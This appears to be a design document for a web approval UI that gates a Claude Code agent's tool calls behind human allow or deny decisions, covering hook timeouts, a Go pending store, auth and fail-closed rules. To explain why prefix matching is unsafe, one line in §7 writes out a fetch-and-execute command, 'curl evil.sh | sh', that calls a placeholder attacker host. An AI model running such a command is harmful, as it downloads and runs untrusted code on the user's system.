# Claude Code Approval UI — Design

**Status:** Draft. Timeout budget VERIFIED 2026-08-27 (see "Hook Blocking Budget").
**Date:** 2026-08-27
**Branch:** `feat/claude-code-agent-provider`
**Builds on:** `docs/planning/2026-08-25-claude-code-agent-provider-design.md` (Phase 0, complete)

## Goal

Give a human an interactive way to approve or deny a Claude Code agent's gated
tool calls from Huginn's web UI, replacing today's behaviour where any tool that
is gated but not allowlisted is denied every time with no prompt.

This is **Phase 1** of the UI work. Phase 2 (agent creation / session picker) is
out of scope and gets its own spec.

## Background

Phase 0 shipped the mechanism: a `PreToolUse` hook (`cmd_claude_approve.go`)
POSTs to `POST /api/v1/claude/approve`, which checks the agent's
`ClaudeAllowedTools` and answers allow or deny. There is no human in that loop.
A tool in `ClaudeGatedTools` but absent from `ClaudeAllowedTools` is denied
deterministically, forever.

There is no existing web approval surface to extend:

- `diff_review_mode` (`internal/config/config.go:106`) is TUI-only config.
- `runtimeState === 'approval'` (`web/src/views/ChatView.vue:83`) is a frontend
  display state, not an approval flow.
- `internal/permissions.Gate` is a real permission system, but
  `handleClaudeApprove` never consults it. See §2 for why it stays that way.

## Hook Blocking Budget (VERIFIED)

**Result, 2026-08-27: Claude Code honours a 300s hook timeout, and a deny
returned after 290s of blocking is respected.** §3 is settled.

Two facts, both established empirically:

1. A hook that does not answer within its declared `timeout` is **killed, and
   the tool runs anyway** — hooks fail OPEN on timeout. Probed with
   `"timeout": 5` and a hook sleeping 25s.
2. A hook declaring `"timeout": 300` is **not clamped**. It blocked for the full
   290s and its deny was honoured. Probe evidence: ticks reached 290/290;
   `TOOL_RAN` never created; `permission_denials` contained the single `Bash`
   call; the reason string propagated back to the model; 310s elapsed.

Fact 1 is why the derived-timeout guard in §3 exists at all. Fact 2 is what
makes a five-minute human wait viable rather than a permission UI that only
appears to gate.

Re-run the probe below if the Claude Code version changes — fact 2 is a
behaviour of the CLI, not a documented contract, and it could regress.

### Probe (for re-verification)

Run from a shell. Writes only under `/tmp/hookprobe`. Does not touch Huginn,
user config, or this branch. Holds one `claude` session for ~5 minutes and costs
one trivial turn.

```
mkdir -p /tmp/hookprobe && cd /tmp/hookprobe && rm -f ticks.log TOOL_RAN \
  && printf '%s\n' '#!/bin/bash' 'L=/tmp/hookprobe/ticks.log' \
     'for i in $(seq 1 290); do echo "$i" >> "$L"; sleep 1; done' \
     'echo "{\"hookSpecificOutput\":{\"hookEventName\":\"PreToolUse\",\"permissionDecision\":\"deny\",\"permissionDecisionReason\":\"probe\"}}"' \
     'exit 0' > hook.sh \
  && chmod +x hook.sh \
  && time claude -p 'Run the bash command: echo hi > /tmp/hookprobe/TOOL_RAN' \
       --output-format json \
       --settings '{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"/tmp/hookprobe/hook.sh","timeout":300}]}]}}' ; \
  echo "last tick: $(tail -1 /tmp/hookprobe/ticks.log 2>/dev/null)" ; \
  echo "tool ran: $(test -f /tmp/hookprobe/TOOL_RAN && echo YES-FAILED-OPEN || echo no-blocked)"
```

### Outcomes

| Last tick | Tool ran | Meaning |
|---|---|---|
| **290** | **no** | **OBSERVED 2026-08-27.** 300s honoured, decision respected. |
| 290 | YES | Hook survived, deny ignored. Gating broken; stop and redesign. |
| < 290 | YES | Hard ceiling at that tick. Retune §3 to ceiling minus margin. |

On a regression to either failing row, §3's constants are wrong and the fix is
not a retune of the UI. If a future ceiling lands below ~10s, live blocking is
not viable at all and Phase 1 becomes a different feature: the hook denies
immediately, the card offers `[Allow and retry]`, and approval re-runs the tool
on the next turn rather than unblocking a held one.

## 1. Decisions

| Decision | Choice |
|---|---|
| Multiple pending requests | Independent cards, each with its own countdown |
| Placement | Inline in the agent's conversation + global sidebar badge |
| Detail shown | Tool name, command or path, bounded excerpt (Write: path + ~2KB) |
| No answer | Deny, agent continues |
| Memory | Exact-command (process-scoped) + tool promotion (persistent) |
| Out-of-browser reach | Desktop notification via existing `useBrowserNotifications` |
| Mechanism | New store; reuse WS, audit, notifications; `permissions.Gate` untouched |

## 2. Approach

**Chosen: a dedicated pending-approval store, reusing peripheral infrastructure.**

`internal/permissions.Gate` already implements a permission system with
`Decision{Allow, AllowAll, Deny}`, request-id correlation
(`RegisterRelayResponse` / `DeliverRelayResponse`), LRU eviction, a leak sweep,
and `Fork`. Routing Claude Code approvals through it was considered and
rejected:

- `PermissionRequest` carries `tools.PermissionLevel` and a registry `Provider`.
  Neither is meaningful for a tool executing inside another process.
- `Gate.sessionAllowed` is keyed by tool name per-gate, not per-agent.
- `promptFuncTimeout` is a **package-level var** shared with the TUI, fixed at
  30s. This design needs ~290s. Making it per-gate means editing well-tested
  code the TUI depends on, to reconcile two budgets that have no reason to
  agree.

The genuine overlap is the *waiting* mechanism, not the classification. Cloning
~80 lines of correlation pattern is cheaper and lower-risk than reshaping a
tested gate. `permissions.Gate` is not modified by this work.

Peripheral infrastructure IS reused: `WSHub` for push, `auditLogger` for the
record, `useBrowserNotifications` for reach.

## 3. Timeouts (verified — see Hook Blocking Budget)

| Constant | Value | Where |
|---|---|---|
| Hook timeout | 300s | `claudecode.ClaudeHookTimeoutSecs` |
| Hook HTTP client timeout | 290s | `claudeApproveTimeout`, derived |
| Store deadline | 285s | Field on the store, injectable |

The existing compile-time guard (`const _ = uint(ClaudeHookTimeoutSecs - 15)`)
stays. It prevents a zero client timeout, which Go's `http.Client` reads as
"no timeout".

The store deadline is a **struct field, not a package constant**. This is the
direct lesson of `Gate.promptFuncTimeout`: a package-level timeout cannot be
tuned per instance and cannot be shortened in tests without global effects. Do
not reintroduce that constraint.

**No automated test validates 300s.** Tests prove the store denies on deadline.
Only the probe proves Claude Code honours a 300s hook, and it is a CLI behaviour
rather than a documented contract. These are different claims; do not conflate
them in test names or comments, and do not add a test that pretends to cover the
second one.

A claude-code agent can hold its session semaphore for the full wait. A toolbelt
agent gives up in 30s. This asymmetry is intentional — approving `rm -rf` is not
picking a menu item — but it is real and should not surprise anyone reading the
code.

## 4. Components

### New

**`internal/claudecode/approvals`** — the pending store.

```go
// Decision is what a human (or the deadline) returned.
type Decision int

const (
    Deny          Decision = iota // deny this call
    Allow                         // allow this call only
    AllowCommand                  // allow, and remember this exact command (§7)
    AllowTool                     // allow, and promote the tool in config (§7)
)

// maxPending bounds how many approvals may be in flight at once, across all
// agents. A blocked hook holds a goroutine and an HTTP connection for up to the
// store deadline, so this is a real resource bound, not a formality. Register
// returns an error at the cap and the handler denies — fail closed, never queue.
const maxPending = 64

type Store struct {
    mu       sync.Mutex
    pending  map[string]*pending  // requestID -> entry
    deadline time.Duration        // injectable; NOT a package constant
    allowed  *cmdMemory           // exact-command memory, per agent
}

type pending struct {
    ID        string
    AgentName string
    ToolName  string
    Summary   string    // command or path
    Excerpt   string    // bounded
    CWD       string
    ch        chan Decision
    expiresAt time.Time
}
```

- `Register(req) (*pending, error)` — creates the entry; errors at `maxPending`.
- `Wait(ctx, id) Decision` — blocks until decision or deadline. Deadline yields `Deny`.
- `Deliver(id string, d Decision) bool` — false on unknown id.
- `List() []PendingView` — for the reconnect endpoint; `RemainingMS` computed at call time.
- Background sweep evicts entries whose waiter vanished.

**`web/src/composables/useClaudeApprovals.ts`** — single frontend source of
truth. Registers handlers for the two new message types via the existing
registry (`useHuginnWS.ts:174` dispatches on `msg.type`; no switch to edit).
Fetches `GET /api/v1/claude/approvals` on connect and on epoch change. Exposes
`decide(id, decision)`.

**`web/src/components/ClaudeApprovalCard.vue`** — tool name, command or path,
bounded excerpt, countdown, Allow / Deny, and conditionally the memory
affordances.

### Modified

**`cmd_claude_approve.go`** — restores `tool_input` to the POST, **truncated at
the hook**. Truncation here is what keeps payload size from ever influencing a
permission decision. This re-opens the bug final-review Fix 3 closed by removing
the field; truncation fixes it at the source rather than by omission.

Truncation rules: `Bash` sends `command` verbatim up to 4 KiB. `Write` sends
`file_path` plus the first 2 KiB of `content`. `Edit` sends `file_path` plus the
first 2 KiB of `new_string`. Every other tool sends `file_path` or `url` if
present, plus a 2 KiB JSON excerpt of the remaining input.

**`internal/server/handlers_claude_approve.go`** — after the allowlist check
fails, register a pending entry, broadcast, block on `Wait`, respond.

**`internal/server/ws.go`** — two outbound message types:
`claude_approval_pending`, `claude_approval_resolved`.

**`internal/server/server.go`** — two new routes in the **authenticated** block;
lower this route's body cap (see §6).

**`web/src/views/ChatView.vue`** — renders cards for the current agent inline.

## 5. Lifecycle

1. Claude fires `PreToolUse`. Hook POSTs to `/api/v1/claude/approve` with
   truncated `tool_input`.
2. Handler resolves the agent by Claude session id
   (`agentForClaudeSession`, unchanged).
3. Tool is in `ClaudeAllowedTools` — allow immediately. **No card.** Unchanged
   from today.
4. Check the two memories (§7). Hit — allow. **No card.**
5. Miss — `Register`, broadcast `claude_approval_pending`, `Wait`.
6. User clicks. `POST /api/v1/claude/approve/decide` calls `Deliver`. Handler
   returns allow or deny. Broadcast `claude_approval_resolved` removes the card
   from every connected client.
7. Deadline first — `Wait` returns `Deny`. Audit as `prompt_timeout`. Broadcast
   resolved with reason `timed_out`.

**Every exit from step 5 that is not a genuine allow is a deny.** The
fail-closed property Phase 0 established is preserved end to end.

## 6. State, restart, reconnect, auth

### In-memory only, deliberately

A pending approval is a live waiter: a blocked HTTP request from a hook
belonging to a `claude` process that is a child of Huginn. If Huginn dies, that
child dies, the turn dies, and the entry describes something that no longer
exists. Persisting to SQLite or Pebble would only resurrect cards nobody can
answer. **State that cannot outlive its waiter must not be durable.**

### Restart

No recovery logic. The store returns empty, which is accurate. `WSMessage.Epoch`
already signals server restart; the frontend clears cards on epoch change and
re-fetches. There is no stale-card path.

### Reconnect

On every WS connect the frontend calls `GET /api/v1/claude/approvals` and
**replaces** its list wholesale — server authoritative, no merge logic.

The response returns `remaining_ms` computed server-side, **never an absolute
wall-clock expiry**. Client clock skew must not be able to make a card look
expired when it is not. The client counts down locally for display only; the
server is the sole authority on actual expiry.

### Auth

The seam is already established and documented at `internal/server/server.go:1056`.

- `POST /api/v1/claude/approve` stays **unauthenticated, loopback-only**. The
  hook is a local child process with no token; wrapping it in `api()` would 401
  every approval into a silent deny.
- `POST /api/v1/claude/approve/decide` and `GET /api/v1/claude/approvals` go in
  the **authenticated** block with `api()`, beside `/claude/status` and
  `/claude/backfill`.

`/claude/approve/decide` is the endpoint that turns "denied" into "allowed". It
is the most security-sensitive route this feature adds. It must never move to
the unauthenticated block for convenience.

### Body cap

Lower the cap on `/api/v1/claude/approve` from `1<<20` to `64<<10`. With hook-side
truncation a large body is now a bug signal, not a legitimate request, and a
tight cap makes that loud.

## 7. Memory

### Exact command, process-scoped

Key: `(agent name, tool name, byte-exact command string)`.

**Normalization: trailing-whitespace trim only.** No case folding, no whitespace
collapsing, no path canonicalization. Every normalization step is a place where
two different commands collapse to one key, and that is the entire attack
surface.

**Restricted to `Bash`.** It requires a stable identifying argument, and
`Bash.command` is the only gated tool that has one — `Write` and `Edit` carry
different content each call, so a remembered decision would either never hit or
match far too broadly. `Bash` is also where repetition actually hurts
(`go test ./...` fifteen times in one turn). For every other gated tool the card
does not show this option.

Capped at 1000 entries per agent with LRU eviction, following
`permissions.Gate.sessionAllowed`.

**"This session" means this Huginn process** — not this chat session, not this
Claude session. The UI label must say so.

Explicitly NOT built: prefix or pattern matching. `npm test` as a prefix
authorizes `npm test && curl evil.sh | sh`. Exact match is safe because the
remembered command has exactly the effect already approved.

### Tool promotion, persistent

"Always allow Bash for Codey" appends to that agent's `ClaudeAllowedTools` and
saves through the existing agent-update path (`handleUpdateAgent`), not a new
write path. Takes effect immediately — `agentForClaudeSession` calls
`LoadAgents()` per request, so there is no cache to invalidate.

This is a **privilege escalation performed by a browser click**. It permanently
removes a tool from gating for that agent; afterward there is no card and no
prompt, ever. Therefore:

- It requires a confirmation step distinct from one-click Allow.
- For Phase 1, the undo is editing the agent config file. Making it visible and
  reversible in the config UI is Phase 2.

It also worsens the already-deferred `LoadAgents()`-per-request concern: config
is now written on a user-facing path as well as read on a hot one. Still
deferred; named here so it is not rediscovered as a surprise.

## 8. UI

Cards stack newest-first inline in the agent's conversation:

```
┌─ Codey ──────────────────────────┐
│ ⚠ Bash  · go test ./...          │
│   cwd ~/Development/huginn       │
│                                  │
│   [Allow]  [Deny]       4m12s    │
│   ⤷ Always allow this command    │
│     (this session)               │
│   ⤷ Always allow Bash for Codey  │
│     (saved to agent config)      │
└──────────────────────────────────┘
```

The sidebar badge counts pending across all agents and is **derived from the
same reactive list's length**, never an independent counter.
`web/src/composables/unseenSessions.ts` exists because a badge once stayed
positive forever after its count drifted from the thing it counted. Deriving
makes that failure unrepresentable rather than merely fixed.

A desktop notification fires on each new pending request via
`useBrowserNotifications.notify()` — already built and tested.

A fully closed browser still means the request ages out and denies. That is
accepted, and it is safe.

## 9. Testing

### Go

1. **Store** — deliver yields allow; deadline yields deny; deliver on unknown id
   returns false; concurrent deliver-vs-expire produces exactly one winner under
   `-race`.
2. **Handler** — allowlisted tool allows with **no** broadcast; gated tool
   registers pending and broadcasts; decide-allow returns allow; deadline returns
   deny and audits `prompt_timeout`.
3. **Fail-closed** — unknown agent, malformed body, nil store, store at capacity:
   every one denies.
4. **Memory** — exact-command hit skips the card; a command differing by **one
   byte** does not hit; non-`Bash` tools neither offer nor consult it; LRU evicts
   at the cap.

### Frontend (vitest)

- Pending adds a card; resolved removes it; epoch change clears and refetches;
  reconnect replaces the list wholesale rather than merging.
- A card resolved while disconnected leaves the badge at zero.
- Countdown renders from `remaining_ms`, not a wall-clock timestamp.

### Hollow-test guard

Eight hollow tests were found during Phase 0. Every implementer dispatch must
require the implementer to **state what they broke to watch each test go red**.

The specific hollow test expected here: a "denies on timeout" test against a
store with a zero deadline. It passes while proving nothing, because zero denies
instantly for the wrong reason.

The counter-check that caught all eight: *would the obvious wrong implementation
still pass this test?*

## 10. Constraints

- **No test may invoke the real `claude` CLI, touch the network, or spend money.**
- `git stash` / `git stash pop` are forbidden — a pre-existing `stash@{0}` must
  not be disturbed.
- `git add` by explicit path only; never `git add -A`.
- No writes under `web/` beyond the files named in §4.
- No starting a server, no `pnpm install`, no `make build-frontend`.
- Approval fails closed: any path that cannot obtain a genuine allow must deny.
- `internal/permissions` is not modified by this work.

## 11. Out of scope

- Phase 2: agent creation UI, Claude session picker, config-visible/reversible
  tool promotion.
- TUI parity for approvals.
- Prefix or pattern command matching (see §7 — deliberately excluded).
- Durable pending approvals (see §6 — deliberately excluded).
- The `LoadAgents()`-per-request concern (deferred from Phase 0, still deferred).
